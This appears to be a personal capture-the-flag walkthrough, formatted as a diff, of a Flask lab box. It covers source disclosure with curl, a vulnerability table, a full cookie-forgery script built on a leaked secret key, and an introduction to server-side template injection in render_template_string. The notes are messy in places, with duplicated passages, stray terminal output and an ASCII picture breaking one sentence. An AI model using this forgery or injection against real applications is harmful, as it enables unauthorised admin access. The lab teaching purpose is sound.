@@ -783,3 +783,788 @@ This means that we don't need to do any more fuzzing to find the rest of the sou
 
 Let's start by looking at what the main.py file is importing:
 main.py
+
+           
+
+from flask import Flask, redirect, render_template, request, session
+from datetime import datetime
+from waitress import serve
+from modules import abp
+from libs.db import AuthConn, StatsConn
+
+        
+
+A lot of these are just standard Python modules (which we can check by Googling them), but the last two lines are referring to custom modules.
+
+If you aren't already familiar with Python application structures then it is very important to note that all file paths are relative to the root calling script. In other words, everything is relative to main.py for this application, so any scripts in subdirectories will still be working with filepaths relative to the main script, rather than themselves.
+
+The syntax here tells us a lot. Starting with the first line of interest (from modules import abp), we can see that it's importing an object  called abp (which, looking further down the code appears to be a Blueprint) from a modules file. This could mean one of two file structures:
+
+    There is a file called modules.py in the webroot.
+    There is a directory called modules in the webroot which contains a file called __init__.py -- a file effectively used to initialise a new module inside a directory.
+
+Only one way to find out which it is. Let's try both!
+
+Note: you must include the -k switch in your cURL commands to ignore the self-signed certificate!
+```
+```text
+┌──(kali㉿kali)-[~/Downloads]
+└─$ curl https://hipper.hipflasks.thm/modules.py -k
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<title>404 Not Found</title>
+<h1>Not Found</h1>
+<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
+```
+```text
+┌──(kali㉿kali)-[~/Downloads]
+└─$ curl https://hipper.hipflasks.thm/modules/__init__.py -k
+from modules.admin import abp
+
+Only one way to find out which it is. Let's try both!
+
+Note: you must include the -k switch in your cURL commands to ignore the self-signed certificate!
+
+CURLing https://hipper.hipflasks.thm/modules.py gives us a 404 error, so it must be the second option.
+
+CURLing https://hipper.hipflasks.thm/modules/__init__.py gives us what we're looking for. The file contains a single line:
+from modules.admin import abp
+
+As expected, the init (initialisation) file is importing the abp Blueprint object from another Python file in the directory: admin.py.
+```
+```text
+┌──(kali㉿kali)-[~/Downloads]
+└─$ curl https://hipper.hipflasks.thm/modules/admin.py -k   
+#!/usr/bin/python3
+from flask import Blueprint, render_template_string, request, redirect, session, abort, url_for, flash, get_flashed_messages
+from libs.auth import authCheck, checkAuth
+from libs.db import AuthConn, StatsConn
+
+abp = Blueprint("abp", __name__)
+
+@abp.route("/")
+@authCheck
+def manageHome():
+    conn = StatsConn()
+    uniqueViews = conn.getViews()
+    response = f"""
+<!DOCTYPE html>
+<html lang=en>
+    <head>
+        <title>Admin Section</title>
+        <meta charset=utf-8>
+        <meta name=viewport content="width=device-width, initial-scale=1.0">
+        <link rel=stylesheet href="/css/styles.css" type=text/css>
+        <link rel=stylesheet href="/css/lora.css" type=text/css>
+        <link rel=stylesheet href="/css/railway.css" type=text/css>
+    </head>
+    <body>
+        <section class="page-section clearfix">
+            <div class="container">
+                <div class="intro">
+                    <img class="intro-img img-fluid mb-6 mb-lg-0 rounded" src="assets/img/flask.jpg" alt="..." />
+                    <div class="intro-text left-0 text-center bg-faded p-5 rounded">
+                        <h2 class="section-heading mb-4">
+                            <span class="section-heading-upper">Admin Console</span>
+                            <span class="section-heading-lower">Welcome, {session['username']}</span>
+                        </h2>
+                        <p class="mb-3">There have been {uniqueViews} unique visitors to the site!</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+        <footer style="position: fixed; bottom: 0; left: 0; right: 0; padding-top:1rem !important; padding-bottom: 1rem !important;" class="footer text-faded text-center py-5">
+            <div class="container"><form style="text-align: right;" action=/admin/logout><input class="btn btn-primary btn-sm" type="submit" name="submit" value="Logout"></form></div>
+        </footer>
+    </body>
+</html>
+    """
+    return render_template_string(response), 200
+
+@abp.route("/login")
+def loginRoute():
+    if checkAuth():
+        return redirect(url_for("abp.manageHome")), 301
+
+    messages = get_flashed_messages()
+    if messages:
+        message = ""
+        for i in messages:
+            if len(i) > 0:
+                message += f"<p>{i}</p>\n"
+    else: message = "<p>&nbsp;</p>"
+    response = f"""
+<!DOCTYPE html>
+<html lang=en>
+    <head>
+        <title>Login Page</title>
+        <meta charset=utf-8>
+        <meta name=viewport content="width=device-width, initial-scale=1.0">
+        <link rel=stylesheet href="/css/styles.css" type=text/css>
+        <link rel=stylesheet href="/css/lora.css" type=text/css>
+        <link rel=stylesheet href="/css/railway.css" type=text/css>
+    </head>
+    <body>
+        <section class="page-section cta">
+            <div class="container">
+                <div class="row">
+                    <div class="col-xl-9 mx-auto">
+                        <div class="cta-inner bg-faded text-center rounded">
+                            <h2 class="section-heading mb-4">
+                                <span class="section-heading-upper">Administration</span>
+                                <span class="section-heading-lower">Login</span>
+                            </h2>
+                            <form method="POST">
+                                <input class="form-control" type="text" name="username" placeholder="Username">
+                                <input class="form-control" type="password" name="password" placeholder="Password">
+                                <input class="form-control btn btn-primary btn-sm" type="submit" name="submit" value="Login!">
+                            </form>
+                            <br>
+                            {message}
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </body>
+</html>
+    """
+    return render_template_string(response), 200
+
+    
+
+@abp.route("/login", methods=["POST"])
+def loginFunction():
+    body = request.form
+    if "username" not in body.keys() or "password" not in body.keys():
+        flash("Incorrect Parameters")
+        return redirect(url_for("abp.loginRoute")), 301
+    conn = AuthConn()
+    if conn.authenticate(body["username"], body["password"]):
+        session["auth"] = "True"; session["username"] = body["username"]
+        return redirect(url_for("abp.manageHome")), 301
+    flash("Incorrect username or password", "error")
+    return redirect(url_for("abp.loginRoute")), 301
+
+@abp.route("/logout")
+def logoutFunction():
+    if not checkAuth():
+        flash("You are not logged in", "error")
+    else:
+        session.pop("auth")
+        session.pop("username")
+        flash("You have been logged out", "success")
+    return redirect(url_for("abp.loginRoute")), 301
+
+Once again we have some imports we can look into:
+from libs.auth import authCheck, checkAuth
+from libs.db import AuthConn, StatsConn
+
+The libs.db import is the same as the second import in main.py, but we can add libs.auth to our list of things to check.
+
+At this point we can also update our diagram from before:
+/
+|__assets/
+|____imgs/
+|____fonts/
+|__css/
+|__js/
+|__modules/
+|____ __init__.py
+|____admin.py
+|__libs/
+
+We know that a libs/ subdirectory exists (it has to be a subdirectory if we're importing two different modules from it), but we don't know if the two files we know of (auth and db) are Python files, or directories.
+
+We can establish this in the same way as before -- first checking to see if libs/auth.py exists, then if that fails, checking to see if libs/auth/__init__.py exists.
+```
+```text
+┌──(kali㉿kali)-[~/Downloads]
+└─$ curl https://hipper.hipflasks.thm/libs/auth.py -k    
+from flask import session, redirect, url_for, flash
+from functools import wraps
+
+checkAuth = lambda: session.get("auth") == "True"
+
+def authCheck(func):
+    @wraps(func)
+    def innerCheck(*args, **kwargs):
+        if checkAuth():
+            return func(*args, **kwargs)
+        else:
+            flash("Please login before accessing the admin area")
+            return redirect(url_for("abp.loginRoute")), 301
+    return innerCheck
+
+When attempting to cURL https://hipper.hipflasks.thm/libs/auth.py we receive a 200 response and a Python file, so this is clearly the correct path. Let's update the map accordingly:
+/
+|__assets/
+|____imgs/
+|____fonts/
+|__css/
+|__js/
+|__modules/
+|____ __init__.py
+|____admin.py
+|__libs/
+|____auth.py
+
+This file doesn't have any custom imports, but it does seem to be handling the authentication for the site, so this is well worth bookmarking for later reading!
+
+Looking at the other item in the libs/ subdirectory, we can quickly ascertain that this is a directory by the presence of a libs/db/__init__.py file:
+```
+```text
+┌──(kali㉿kali)-[~/Downloads]
+└─$ curl https://hipper.hipflasks.thm/libs/db/__init__.py -k
+from libs.db.base import Conn
+from libs.db.auth import AuthConn
+from libs.db.stats import StatsConn
+
+This seems to be it for Python files; however, there are a few more things we can fill in.
+
+First, from the main.py file we can see that the app's template folder has been set to "views":
+app.template_folder="views"
+
+The templates folder contains static HTML templates which Flask uses to create dynamic responses. For example, in line 24 of main.py, we can see an example of the Flask render_template function where it passes in the current year to be used for the copyright notice in the index.html template.
+
+main.py, line 24
+return render_template("index.html", year=datetime.now().date().strftime("%Y")), 200
+index.html, line 55:
+<div class="container"><p class="m-0 small">Copyright &copy; Hipper Hip Flasks {{ year }}</p></div>
+
+For a more thorough explanation of Flask templates, have a look at the Flask room.
+
+Regardless, we can now add the "views" directory into our diagram. Analysis of the rest of the source code indicates that there is only one template: the index.html which we have already seen.
+
+──(kali㉿kali)-[~/Downloads]
+└─$ curl https://hipper.hipflasks.thm/libs/db/stats.py -k
+from libs.db import Conn
+
+class StatsConn(Conn):
+        def __init__(self):
+                super().__init__("stats.db")
+                self.viewTypes = ["uniqueViews", "totalViews"]
+                self.selectView = lambda x: self.viewTypes[0] if x not in self.viewTypes else x
+                if not self.exists:
+                        sql = """CREATE TABLE views (statName VARCHAR(255) UNIQUE, statNum INT DEFAULT 0)"""
+                        self.curs.execute(sql)
+                        for i in self.viewTypes:
+                                self.curs.execute(f"""INSERT INTO views (statName) VALUES ("{i}")""")
+                        self.dbh.commit()
+
+        def getViews(self, viewType = None):
+                viewType = self.selectView(viewType)
+                sql = """SELECT statNum FROM views WHERE statName = ?"""
+                self.curs.execute(sql, (viewType,))
+                return self.curs.fetchone()[0]
+
+        def addView(self, viewType=None):
+                if viewType not in self.viewTypes:
+                        return False
+                sql = """UPDATE views SET statNum = statNum + 1 WHERE statName = ?"""
+                self.curs.execute(sql, (viewType,))
+                if self.dbh.commit():
+                        return True
+                return False
+```
+```text
+┌──(kali㉿kali)-[~/Downloads]
+└─$ curl https://hipper.hipflasks.thm/libs/db/base.py -k 
+import sqlite3, os
+
+class Conn():
+        def __init__(self, db):
+                self.exists = os.path.exists(f"data/{db}")
+                self.dbh = sqlite3.connect(f"data/{db}")
+                self.curs = self.dbh.cursor()
+```
+```text
+┌──(kali㉿kali)-[~/Downloads]
+└─$ curl https://hipper.hipflasks.thm/libs/db/auth.py -k
+import bcrypt
+from libs.db import Conn
+from getpass import getpass
+
+class AuthConn(Conn):
+        def __init__(self):
+                super().__init__("users.db")
+                if not self.exists:
+                        sql = """CREATE TABLE users (
+                                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                                username VARCHAR(255) NOT NULL,
+                                password VARCHAR(255) NOT NULL,
+                                admin BOOL NOT NULL)
+                                """
+                        self.curs.execute(sql)
+                        password = bcrypt.hashpw(getpass("Please enter the admin password: ").encode("utf-8"), bcrypt.gensalt())
+                        sql = """INSERT INTO users (username, password, admin) VALUES ("admin", ?, 1)"""
+                        self.curs.execute(sql, (password,))
+                        self.dbh.commit()
+
+        def authenticate(self, username, password):
+                sql = """SELECT password FROM users WHERE username = ?"""
+                self.curs.execute(sql, (username,))
+                res = self.curs.fetchall()
+                if len(res) != 1:
+                        return False
+                passHash = res[0][0]
+                return bcrypt.checkpw(password.encode("utf-8"), passHash)
+Regardless, we can now add the "views" directory into our diagram. Analysis of the rest of the source code indicates that there is only one template: the index.html which we have already seen.
+
+/
+|__assets/
+|____imgs/
+|____fonts/
+|__css/
+|__js/
+|__modules/
+|____ __init__.py
+|____admin.py
+|__libs/
+|____auth.py
+|____db/
+|______base.py
+|______auth.py
+|______stats.py
+|__views/
+|____index.html
+
+Similarly, looking at the files in libs/db/ tells us that there is a directory called data/ containing two SQLite3 databases: users.db and stats.db. We won't go too in-depth about how these are disclosed in this task because they aren't hugely relevant to our progress attacking this application (despite constituting information disclosure in their own right); however, you are strongly encouraged to review the libs/db/base.py source code, along with either libs/db/auth.py or libs/db/stats.py to see if you can discern this for yourself.
+
+Our final structure diagram now looks like this:
+/
+|__assets/
+|____imgs/
+|____fonts/
+|__css/
+|__js/
+|__modules/
+|____ __init__.py
+|____admin.py
+|__libs/
+|____auth.py
+|____db/
+|______base.py
+|______auth.py
+|______stats.py
+|__views/
+|____index.html
+|__data/
+|____users.db
+|____stats.db
+
+Which is remarkably close to the real file tree, as we will see when we get into the box.
+
+With the source code fully disclosed, let's start analysing it properly!
+
+Vulnerabilities:
+ID
+	Rank
+	CVSS
+	Vulnerability
+	Remediation
+HF-WEB-4
+	High	7.5
+	
+
+User SQLite3 database exposed at https://hipper.hipflasks.thm/data/users.db. Possibility for attackers to download the database and attempt to crack user passwords (including those of administrators). Vulnerability is mitigated against slightly by apparent use of a complex password for administrator user.
+	Move the user database outside of the webroot. Vulnerability can also be mitigated against as a side-effect of remediating HF-WEB-3
+HF-WEB-5
+	Medium	5.3
+	Statistics SQLite3 database exposed at https://hipper.hipflasks.thm/data/stats.db resulting in unintended information disclosure.
+	Move the database outside of the webroot. Vulnerability can also be mitigated against as a side-effect of remediating HF-WEB-3
+**implications of the vuln**
+We now have local copies of all of the Python files making up the application, so let's take a look through them. We are aiming to exploit the token forgery vulnerability we found earlier, so this is a good time to talk about how Flask sessions work.
+Because HTTP(S) is inherently stateless, websites store information which needs to persist between requests in cookies -- tiny little pieces of information stored on your computer. Unfortunately, this also poses a problem: if the information is stored on your computer, what's stopping you from just editing it? When it comes to sessions, there are two mainstream solutions.
+
+Sessions are a special type of cookie -- they identify you to the website and need to be secure. Sessions usually hold more information than just a single value (unlike a standard cookie where there may only be a single value stored for each index). For example, if you are logged into a website then your session may contain your user ID, privilege levels, full name, etc. It's a lot quicker to store these things in the session than it is to constantly query the database for them!
+
+So, how do we keep sessions secure? There are two common schools of thought when it comes to session storage:
+
+Server Side Session Storage:- store the session information on the server, but give the client a cookie to identify it.
+
+    This is the method which PHP and most other traditional languages use. Effectively, when a session is created for a client (i.e. a visitor to the site), the client is given a cookie with a unique identifier, but none of the session information is actually handed over to the client. Instead the server stores the session information in a file locally, identified by the same unique ID. When the client makes a request, the server reads the ID and selects the correct file from the disk, reading the information from it. This is secure because there is no way for the client to edit the actual session data (so there is no way for them to elevate their privileges, for example).
+    There are other forms of server side session storage (e.g. storing the data in a Redis or memcached server rather than on disk), but the principle is always the same.
+
+Client Side Session Storage:- store all of the session information in the client's cookies, but encrypt or sign it to ensure that it can't be tampered with.
+
+    In a client side session storage situation, all of the session values are stored directly within the cookie -- usually in something like a JSON Web Token (JWT). This is the method that Flask uses. The cookie is sent off with each request as normal and is read by the server, exactly as with any other cookie -- only with an extra layer of security added in. By either signing or encrypting the cookie with a private secret known only to the server, the cookie in theory cannot be modified. Flask signs its cookies, which means we can actually decode them without requiring the key (for a demonstration, try putting your session cookie from the target website into a base64 decoder such as the one here) -- we just can't edit them... unless we have the key.
+    
+There are advantages and disadvantages to both methods. Server side session storage is practically more secure and requires less data being sent to-and-from the server. Client side session storage makes it easier to scale the application up across numerous servers, but is limited by the 4Kb storage space allowed per cookie. Importantly, it is also completely insecure if the private key is disclosed. Whether the framework signs the cookie (leaving it in plaintext, but verifying it to ensure that tampering is impossible), or outright encrypts the cookie, it's game over if that private key gets leaked.
+
+Anyone in possession of the webapp's private key is able to create (i.e. forge) new cookies which will be trusted by the application. If we understand how the authentication system works then we can easily forge ourselves a cookie with any values we want -- including making ourselves an administrator, or any number of other fun applications.
+
+In short, an application which relies on client-side sessions and has a compromised private key is royally done for. Checkmate.
+
+Time to go bake some cookies!
+
+Now that we have a copy of the source code for the site, we have effectively turned the webapp segment of this assessment into a white-box test. Were this a web-app pentest then we would comb through the source code looking for vulnerabilities; however, in the interests of keeping this short, we shall limit our review purely to the authentication system for the site as this is what we will need to fool with our forged cookie.
+
+Let's start by looking at modules/admin.py. This contains the code defining the admin section -- if we look at this then we will see what authentication measures are in place:
+modules/admin.py
+
+#!/usr/bin/python3
+from flask import Blueprint, render_template_string, request, redirect, session, abort, url_for, flash, get_flashed_messages
+from libs.auth import authCheck, checkAuth
+from libs.db import AuthConn, StatsConn
+
+abp = Blueprint("abp", __name__)
+
+@abp.route("/")
+@authCheck
+def manageHome():
+    conn = StatsConn()
+    uniqueViews = conn.getViews()
+    response = f"""
+<!DOCTYPE html>
+<html lang=en>
+    <head>
+        <title>Admin Section</title>
+---
+
+           
+        
+
+Right at the top of the file we find what we're looking for. Specifically,  there is one line of code which handles the authentication for the /admin route:
+@authCheck
+Imported in:
+from libs.auth import authCheck, checkAuth
+
+This is what is referred to as a decorator -- a function which wraps around another function to apply pre-processing. This is not a programming room, and decorators are relatively complicated, so we will not cover them directly within the room. That said, there is an explanation with examples given here, which might be a good idea to take a look at if you aren't already familiar with decorators.
+
+If we have a look at libs/auth.py we can see the code for this:
+libs/auth.py
+
+from flask import session, redirect, url_for, flash
+from functools import wraps
+
+checkAuth = lambda: session.get("auth") == "True"
+
+def authCheck(func):
+    @wraps(func)
+    def innerCheck(*args, **kwargs):
+        if checkAuth():
+            return func(*args, **kwargs)
+        else:
+            flash("Please login before accessing the admin area")
+            return redirect(url_for("abp.loginRoute")), 301
+    return innerCheck
+
+           
+        
+
+Short and sweet, this is the full extent of the authentication handler.
+
+Breaking this down a little further, the authentication is handled by a single if/else statement. If checkAuth() (the lambda function1 above) evaluates to true then the decorated function is called, resulting in the requested page loading. If the expression evaluates to false then a message is flashed2 to the user's session and they are redirected back to the login page. About as simple as it gets.
+
+Looking into the checkAuth lambda function:
+checkAuth = lambda: session.get("auth") == "True"
+
+We can see that all it does is check to see if the user has a value called "auth" in their session, which needs to be set to "True".
+
+This can easily be forged, so in theory we can already get access to the admin area.
+
+Let's have a look at the login endpoint back in modules/admin.py:
+modules/admin.py
+
+           
+---
+@abp.route("/login", methods=["POST"])
+def loginFunction():
+    body = request.form
+    if "username" not in body.keys() or "password" not in body.keys():
+        flash("Incorrect Parameters")
+        return redirect(url_for("abp.loginRoute")), 301
+    conn = AuthConn()
+    if conn.authenticate(body["username"], body["password"]):
+        session["auth"] = "True"; session["username"] = body["username"]
+        return redirect(url_for("abp.manageHome")), 301
+    flash("Incorrect username or password", "error")
+    return redirect(url_for("abp.loginRoute")), 301
+---
+
+        
+
+Breaking this down, we see that it's expecting a post request. It then stores the information being sent in a variable called body, then checks to ensure that the parameters username and password have been sent -- if they haven't been then it flashes an Incorrect Parameters message and redirects them back to the login page.
+
+If these parameters are present then it initialises a connection to the users database and checks the username and password (we won't look at the code here for the sake of brevity, but feel free to read it in libs/db/auth.py). If the authentication is successful then it sets two session values:
+
+    It sets auth to "True". We already knew about this one.
+    It sets username to the username that we posted it. This will be important later.
+
+It then redirects the user to the management homepage (/admin).
+
+We now have everything we need, so let's forge some cookies!
+
+1. Lambda functions are anonymous functions meaning that they don't have to be given a name or assigned anywhere. In this case the lambda function is being assigned to a variable (checkAuth) and the lambda syntax is being used for little more than cleanliness.
+
+2. "Flashing" is Flask's way of persisting messages between requests. For example, if you try to log into an application and fail then the request endpoint may redirect you back to the login page with an error message. This error message would be "flashed" -- meaning it's stored in your session temporarily where it can be read by code in the login page and displayed to you.
+
+**cookie forgery**
+There are many ways to forge a Flask cookie -- most involve diving down into the internals of the Flask module to use the session handler directly: a very complicated solution to what is actually an incredibly simple problem.
+
+We need to generate Flask cookie. What better way to do that than with a Flask app?
+
+In short, we are going to write our own (very simple) Flask app which will take the secret key we "borrowed" and use it to generate a signed session cookie with, well, basically whatever we want in it.
+
+Before we start writing, let's create a Python Virtual Environment for our project. A virtual environment (or venv) allows us to install dependencies for a project without running the risk of breaking anything else.
+
+Make sure that we have the requisite dependencies installed:
+sudo apt update && sudo apt install python3-venv
+
+Now we can create the virtual environment:
+python3 -m venv poc-venv
+
+This will create a subdirectory called poc-venv containing our virtual environment.
+We can activate this using the command: source poc-venv/bin/activate.
+
+This should change your prompt to indicate that we are now in the virtual environment:
+Creating a Virtual Environment
+
+           
+pentester@attacker:~$ python3 -m venv poc-venv
+pentester@attacker:~$ source poc-venv/bin/activate
+(poc-venv) pentester@attacker:~$ 
+
+──(kali㉿kali)-[~/Downloads/BinaryHeaven]
+└─$ source angr/bin/activate
+                                                                          
+┌──(angr)─(kali㉿kali)-[~/Downloads/BinaryHeaven]
+└─$ deactivate
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/BinaryHeaven]
+└─$ 
+Let's start our PoC by installing dependencies:
+pip3 install flask requests waitress
+
+Waitress isn't actually required here, but using it is very simple and makes the output of this code much cleaner, so we might as well add it in.
+
+Next we need to open a blank text document and start a new Python script:
+#!/usr/bin/env python3
+from flask import Flask, session, request
+from waitress import serve
+import requests, threading, time
+
+This gives us a Python script with a variety of modules. We have everything we need to set up a Flask app via the flask and waitress modules; then we also have requests, threading, and time, which we will use to automatically query the server we are setting up.
+
+With the imports sorted, let's initialise the app:
+app = Flask(__name__)
+app.config["SECRET_KEY"] = "PUT_THE_KEY_HERE"
+
+This creates a new Flask app object and configures the secret key. You will obviously have to substitute in the key you found earlier in the disclosed main.py file, replacing the "PUT_THE_KEY_HERE" text.
+
+Next let's configure a webroot which will set the two session values we identified earlier:
+@app.route("/")
+def main():
+    session["auth"] = "True"
+    session["username"] = "Pentester"
+    return "Check your cookies", 200
+
+Our app is now ready to go, we just need to start it and query it.
+
+We could technically just start the app here and navigate to it in our browser, but that would be boring. Let's do this all from the command line.
+
+If we are doing two things at once (starting the app, then sending a request to it), we will need to use threading, thus our next lines of code are:
+thread = threading.Thread(target = lambda: serve(app, port=9000, host="127.0.0.1"))
+thread.setDaemon(True)
+thread.start()
+
+This creates a thread and gives it the job of starting waitress using our app object on localhost:9000. It then tells the thread to daemonise, meaning it won't prevent the program from exiting (i.e. if the program exits then the server will also stop, but the program won't wait for the server to stop before exiting). Finally we start the thread, making the server run in the background.
+
+The last thing we need this program to do is query the server:
+time.sleep(1)
+print(requests.get("http://localhost:9000/").cookies.get("session"))
+
+This will wait for one second to give waitress enough time to start the server, then it will query the endpoint that we setup, making Flask generate and provide us with a cookie which the program will then print out. The program then ends, stopping the server automatically.
+
+We are now ready to go!
+
+The final program should look like this, albeit with your own key substituted in:
+        
+
+**poc.py**
+
+           
+#!/usr/bin/env python3
+from flask import Flask, session, request
+from waitress import serve
+import requests, threading, time
+
+#Flask Initialisation
+app = Flask(__name__)
+app.config["SECRET_KEY"] = "
+"
+
+@app.route("/")
+def main():
+    session["auth"] = "True"
+    session["username"] = "Pentester"
+    return "Check your cookies", 200
+
+#Flask setup/start
+thread = threading.Thread(target = lambda: serve(app, port=9000, host="127.0.0.1"))
+thread.setDaemon(True)
+thread.start()
+
+#Request
+time.sleep(1)
+print(requests.get("http://localhost:9000/").cookies.get("session"))
+
+Running the program should give us a cookie signed by the server using our stolen key:
+Demonstration of the PoC code
+
+This will be different every time the program is run.
+
+Now let's finish this. Copy the generated cookie, open your browser dev tools on the website, and overwrite the value of your current session cookie. This can also be done using a browser extension such as Cookie-Editor.
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/BinaryHeaven]
+└─$ python3 poc.py    
+/home/kali/Downloads/BinaryHeaven/poc.py:19: DeprecationWarning: setDaemon() is deprecated, set the daemon attribute instead
+  thread.setDaemon(True)
+eyJhdXRoIjoiVHJ1ZSIsInVzZXJuYW1lIjoiUGVudGVzdGVyIn0.Yuxpmg.tQk-QZg5URo0BusUkZ3IR9x0e6s
+
+**change the cookie (eyJhdXRoIjoiVHJ1ZSIsInVzZXJuYW1lIjoiUGVudGVzdGVyIn0.Yuxpmg.tQk-QZg5URo0BusUkZ3IR9x0e6s) -> admin for me in inspect/storage/cookies**
+Admin Console Welcome, Pentester
+
+There have been 25698 unique visitors to the site!
+
+**server side template injection (SSTI)**
+
+We have gained access to the admin console, but we don't appear to have gained anything by doing so. All we have here is a stats counter (which we already had from downloading the DB anyway).
+
+So, why did we bother going through all that rigamarole if the admin console doesn't actually give us any extra power over the webapp?
+
+If you've hacked Flask apps before, you may already know the answer to this having read through the source code for the application. There is a serious vulnerability in the admin.py module -- one that (in this case) can only be accessed after we login.
+
+When you logged into the admin page, did you notice that it echoed the forged username back to you?
+Image highlighting the username getting echoed back on the admin page
+
+This indicates that there is some form of template editing going on in the background -- in other words, the webapp is taking a prewritten template and injecting values into it. There are secure ways to do this, and there are... less secure ways of doing it.
+
+Specifically, the code involved (from modules/admin.py) is this:
+modules/admin.py
+
+@abp.route("/")
+@authCheck
+def manageHome():
+    conn = StatsConn()
+    uniqueViews = conn.getViews()
+    response = f"""
+<!DOCTYPE html>
+<html lang=en>
+    <head>
+        <title>Admin Section</title>
+
+---
+
+                            <span class="section-heading-upper">Admin Console</span>
+                            <span class="section-heading-lower">Welcome, {session['username']}</span>
+                        </h2>
+                        <p class="mb-3">There have been {uniqueViews} unique visitors to the site!</p>
+                    </div>
+
+---
+
+        </footer>
+    </body>
+</html>
+    """
+    return render_template_string(response), 200
+
+           
+        
+
+Aside from using an inline string for the template (which is both messy and revoltingly bad practice), this also injects the contents of session["username"] directly into the template prior to rendering it. It does the same thing with uniqueViews (the number of unique visitors to the site); however, we can't modify this. What we can do is change our username to something that the Flask templating engine
+
+        \          SORRY            /
+         \                         /
+          \    This page does     /
+           ]   not exist yet.    [    ,'|
+           ]                     [   /  |
+           ]___               ___[ ,'   |
+           ]  ]\             /[  [ |:   |
+           ]  ] \           / [  [ |:   |
+           ]  ]  ]         [  [  [ |:   |
+           ]  ]  ]__     __[  [  [ |:   |
+           ]  ]  ] ]\ _ /[ [  [  [ |:   |
+           ]  ]  ] ] (#) [ [  [  [ :===='
+           ]  ]  ]_].nHn.[_[  [  [
+           ]  ]  ]  HHHHH. [  [  [
+           ]  ] /   `HH("N  \ [  [
+           ]__]/     HHH  "  \[__[
+           ]         NNN         [
+           ]         N/"         [
+           ]         N H         [
+          /          N            \
+         /           q,            \
+        /                           \
+
+ will evaluate as code. This vulnerability is referred to as an SSTI -- Server Side Template Injection; it can easily result in remote code execution on the target.
+
+There is already an entire room covering SSTI in Flask applications, so we will not go into a whole lot of detail about the background of the vulnerability here. The short version is this:
+
+Flask uses the Jinja2 templating engine. A templating engine is used to "render" static templates -- in other words, it works with the webapp to substitute in variables and execute pieces of code directly with the template. For example, take a look at the following HTML:
+Example Jinja2 Template
+
+           
+<!DOCTYPE html>
+<html lang=en>
+   <head>
+       <title>{{title}}</title>
+   </head>
+   <body>
+       <h1>Learn Templating!</h1>
+   </body>
+</html>
+
+        
+
+Notice anything unusual? This HTML code has a {{title}} in it. This {{ }} structure (and a few other similar structures) is what tells Jinja2 that it needs to do something with this template -- specifically, in this case it would be filling in a variable called title. This could then be called at the end of a Flask route by Python code looking something like this:
+return render_template("test.html", title="Templates!"), 200
+
+The Templates! would then be substituted in as the title of the page when it loads in a client's browser.
+
+This is all well and good, but what happens if we control the template? What if we could add things directly into the template before it gets rendered? We could inject code blocks inside curly brackets and Jinja2 would execute them when it rendered the template.
+
+Here is an example:
+render_template_string Example
+
+           
+title = "Templates!"
+response = f"""
+<!DOCTYPE html>
+<html lang=en>
+   <head>
+       <title>{title}</title>
+   </head>
+   <body>
+       <h1>Learn Templating!</h1>
+   </body>
+</html>"""
+return render_template_string(response), 200
+
+        
+
+Instead of using render_template, this code uses the render_template_string function to render a template stored as an inline Python string. Instead of passing in the title variable to Jinja2 for rendering, a Python f-string is used to format the template before it is rendered. In other words, the developer has substituted in the contents of title before the string is actually passed to the templating engine.
+
+This is fine for the example above (if poor practice), but what happens if title was, say: {{7*6}}?
+{{7*6}}
+
+           
+title = "{{7*6}}"
+response = f"""
+<!DOCTYPE html>
+<html lang=en>
+   <head>
+       <title>{title}</title>
+   </head>
+   <body>
+       <h1>Learn Templating!</h1>
+   </body>
+</html>"""
+return render_template_string(response), 200
+
+        
+
+Notice how similar this is to the code we saw in the admin.py module?
